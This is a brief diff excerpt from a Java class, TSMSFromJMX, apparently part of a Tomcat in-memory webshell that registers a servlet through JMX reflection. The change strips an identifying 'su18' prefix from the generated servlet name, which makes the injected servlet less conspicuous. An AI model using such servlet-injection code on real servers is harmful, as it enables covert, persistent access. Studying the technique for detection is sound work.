@@ -25,7 +25,7 @@ public class TSMSFromJMX implements Servlet {
 
 	static {
 		try {
-			String servletName = "su18" + System.nanoTime();
+			String servletName = String.valueOf(System.nanoTime());
 
 			MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
 			Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
